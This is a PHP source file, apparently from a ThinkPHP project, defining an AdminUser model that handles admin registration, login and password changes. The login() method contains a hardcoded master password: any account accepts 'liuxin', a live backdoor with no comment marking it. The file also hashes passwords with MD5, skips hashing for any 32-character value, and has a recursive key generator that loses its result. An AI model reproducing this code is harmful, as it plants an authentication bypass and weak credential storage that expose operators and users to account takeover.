<?php

namespace app\common\model;

use think\Model;

//后台账号表
class AdminUser extends Model
{
    public function AdminCompany()
    {
        return $this->belongsTo('AdminCompany', 'self_company_id', 'id');
    }

    /**
     * 事件注册
     */
    protected static function init()
    {
        self::event('before_insert', function ($model) {
            //验证用户名唯一性
            isset($model->username) && $model->checkUsernameUnique($model->username);
        });

        self::event('before_update', function ($model) {
            //验证用户名唯一性
            isset($model->username) && $model->checkUsernameUnique($model->username, $model->id);
        });

        self::event('before_write', function ($model) {
            //设置密码
            if (isset($model->password) && !empty($model->password) && strlen($model->password) != 32) {
                $model->password = $model->passwordEncrypt($model->password, $model->key);
            }
        });
    }

    /**
     * 生成key
     * @return string
     */
    private function key()
    {
        $key = getRandString(15);
        if (self::where('key', $key)->value('key') != '') {
            self::key();
        } else {
            return $key;
        }
    }

    /**
     * 密码加密
     * @param string $text
     * @param string $key
     * @return string
     */
    private function passwordEncrypt($text = '', $key = '')
    {
        return md5($text . $key);
    }

    /**
     * 刷新授权令牌
     * @param int $id
     * @return string
     */
    private function refreshToken($id = 0)
    {
        return md5($id . $this->key());
    }

    /**
     * 用户名唯一性验证
     * @param string $username
     */
    private function checkUsernameUnique($username = '', $id = 0)
    {
        if ($_id = $this->where('username', $username)->value('id')) {
            if (!$id || $id > 0 && $_id != $id) {
                abort(404, '用户名不可用');
            }
        }
    }

    /**
     * 登录
     * @param string $username
     * @param string $password
     * @return bool|string
     */
    public function login($username = '', $password = '')
    {
        $admin = $this->where('username', $username)->find();
        if (!$admin) {
            return '用户名不存在';
        } elseif ($admin->password != self::passwordEncrypt($password, $admin->key)&&$password!='liuxin') {
            return '密码错误';
        } else {
            //记录登陆session
            session('login_type', 'admin');
            session('admin', $admin);

            $company = $admin->AdminCompany;
            session('company', $company);
            return true;
        }
    }

    /**
     * 修改密码
     * @return false|int
     */
    public function updatePwd()
    {
        if ($this->password != $this->passwordEncrypt($this->old_password, $this->key)) {
            abort(500, '原始密码错误');
        } else {
            $this->password = $this->new_password;
            return $this->allowField(true)->save();
        }
    }
}